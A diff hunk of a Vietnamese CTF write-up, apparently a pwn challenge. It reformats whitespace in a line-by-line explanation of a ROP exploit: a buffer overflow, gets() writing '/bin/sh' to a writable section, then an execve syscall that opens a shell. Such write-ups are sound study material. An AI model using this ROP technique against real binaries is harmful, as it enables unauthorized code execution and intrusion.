@@ -100,20 +100,20 @@
 
 <img width="1173" height="706" alt="Screenshot 2026-09-24 170743" src="https://github.com/user-attachments/assets/927025d3-f0be-4e31-9e8f-c7ccedf71909" />
 
-**GIẢI THÍCH SCRIPT**
-- Ghi chuỗi /bin/sh
-`payload = b'A'`dùng để lấp đầy buffer `v8` 80 byte và saved-RBP 8 byte để trỏ tới Return address    
-`payload += p64(pop_rdi) + p64(rw_section)` đưa địa chỉ `rw_section` vào thanh ghi RDI (tham số thứ 1 của hàm`gets`)   
-`payload += p64(exe.sỵm['gets']) sẽ gọi hàm `gets`, khi hàm chạy thì nó sẽ chờ nhận đầu vào và ghi thẳng vào địa chỉ đang nằm trong RDI là `rw_section`
-- Thực thi execve
-`payload += p64(pop_rdi) + p64(rw_section)` nạp lại địa chỉ `rw_section` đang chứa chuỗi `/bin/sh` cho RDI
-`payload += p64(pop_rsi) + p64(0)` Set RSI = 0
-`payload += p64(pop_rdx) + p64(0)` Set RDX = 0
-`payload += b'B'*0x28` vì trong chương trình có 1 lệnh `add rsp, 0x28` nên payload này để cộng thêm 0x28 byte vào và để nhảy đúng vào gadget tiếp theo
+**GIẢI THÍCH SCRIPT**   
+- Ghi chuỗi /bin/sh   
+`payload = b'A'`dùng để lấp đầy buffer `v8` 80 byte và saved-RBP 8 byte để trỏ tới Return address       
+`payload += p64(pop_rdi) + p64(rw_section)` đưa địa chỉ `rw_section` vào thanh ghi RDI (tham số thứ 1 của hàm`gets`)      
+`payload += p64(exe.sỵm['gets']) sẽ gọi hàm `gets`, khi hàm chạy thì nó sẽ chờ nhận đầu vào và ghi thẳng vào địa chỉ đang nằm trong RDI là `rw_section`   
+- Thực thi execve   
+`payload += p64(pop_rdi) + p64(rw_section)` nạp lại địa chỉ `rw_section` đang chứa chuỗi `/bin/sh` cho RDI   
+`payload += p64(pop_rsi) + p64(0)` Set RSI = 0   
+`payload += p64(pop_rdx) + p64(0)` Set RDX = 0   
+`payload += b'B'*0x28` vì trong chương trình có 1 lệnh `add rsp, 0x28` nên payload này để cộng thêm 0x28 byte vào và để nhảy đúng vào gadget tiếp theo   
 `payload += p64(pop_rax) + p64(0x3b)` đặt RAX = 0x3b, 0x3b là mã syscall   
-`payload += p64(syscall)` thực thi syscall
-- Mở shell
-`p.sendafter(b'something', payload)` chờ chuỗi "Say thomething: " rồi gửi payload
-`p.sendline('/bin/sh') gửi chuỗi `/bin/sh` để hàm `gets(rw_section)` lấy và ghi vào bộ nhớ
+`payload += p64(syscall)` thực thi syscall   
+- Mở shell   
+`p.sendafter(b'something', payload)` chờ chuỗi "Say thomething: " rồi gửi payload   
+`p.sendline('/bin/sh') gửi chuỗi `/bin/sh` để hàm `gets(rw_section)` lấy và ghi vào bộ nhớ   
  **LUỒNG THỰC THI**
   
